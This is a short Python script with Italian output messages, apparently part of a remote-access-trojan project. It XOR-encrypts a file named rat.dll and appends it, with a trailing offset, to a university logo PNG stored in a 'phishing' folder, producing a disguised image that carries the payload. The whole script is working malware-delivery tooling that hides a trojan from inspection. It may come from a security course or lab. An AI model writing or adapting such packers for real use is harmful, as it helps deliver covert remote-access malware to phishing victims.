from pathlib import Path
import sys

XOR_KEY = bytes.fromhex(
    'd683f9ce3e3d091215b422cfef509f00'
    '279815c0ee7451687c615599e743ee28'
)

BASE_DIR = Path(__file__).parent.parent
DLL_PATH = BASE_DIR / 'client' / 'rat.dll'
PNG_PATH = BASE_DIR / 'server' / 'phishing' / 'unisa_logo.png'
OUT_PATH = BASE_DIR / 'server' / 'unisa_logo_stego.png'

def main():
    if not DLL_PATH.exists():
        print(f"[!] rat.dll non trovato: {DLL_PATH}", file=sys.stderr)
        sys.exit(1)
    if not PNG_PATH.exists():
        print(f"[!] PNG non trovato: {PNG_PATH}", file=sys.stderr)
        sys.exit(1)

    dll_bytes = DLL_PATH.read_bytes()
    png_bytes = PNG_PATH.read_bytes()
    enc_dll   = bytes(b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(dll_bytes))
    offset    = len(png_bytes)
    stego     = png_bytes + enc_dll + offset.to_bytes(4, 'little')

    OUT_PATH.write_bytes(stego)
    print(f"[+] {OUT_PATH.name} generato")
    print(f"    PNG: {len(png_bytes):,} byte | DLL: {len(enc_dll):,} byte | offset: 0x{offset:08X}")

if __name__ == '__main__':
    main()
